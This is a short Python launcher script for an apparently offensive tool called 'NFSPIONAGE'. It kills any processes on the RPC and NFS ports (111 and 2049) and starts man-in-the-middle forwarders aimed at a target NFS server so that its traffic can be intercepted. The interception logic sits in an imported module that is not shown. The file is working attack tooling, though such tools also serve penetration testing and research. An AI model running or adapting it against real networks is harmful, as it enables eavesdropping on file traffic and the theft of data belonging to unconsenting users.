import _thread
from datetime import datetime

from helpers import kill_process_on_port, print_console
from port_forwarder import MitmForwarder

PORT_RPC = 111
PORT_NFS = 2049

'''
# ==============================================================================
# NFSPIONAGE ===================================================================
# ==============================================================================
'''


def run(ip_nfs_server):
	print_console("// ========================================================================")
	print_console("Starting NFS MITM @ " + str(datetime.now()) + "\n")
	print_console("SERVER IP:\t\t" + ip_nfs_server)
	print_console("NFS PORT:\t\t" + str(PORT_NFS))

	# kill processes on either port just in case
	kill_process_on_port(PORT_NFS)
	kill_process_on_port(PORT_RPC)

	# start forwarders for NFS and RPC (Remote Procedure Call) for TCP and UDP
	_thread.start_new_thread(MitmForwarder, (ip_nfs_server, PORT_NFS, False))
	# _thread.start_new_thread(MitmForwarder, (ip_nfs_server, PORT_NFS, True))
	_thread.start_new_thread(MitmForwarder, (ip_nfs_server, PORT_RPC, False))
	# _thread.start_new_thread(MitmForwarder, (ip_nfs_server, PORT_RPC, True))

	lock = _thread.allocate_lock()
	lock.acquire()
	lock.acquire()


if __name__ == '__main__':
	import optparse

	parser = optparse.OptionParser()

	parser.add_option(
		'-s', '--server-ip', dest='server_ip',
		help='NFS server IP address to bind to')

	options, args = parser.parse_args()

	run(options.server_ip)
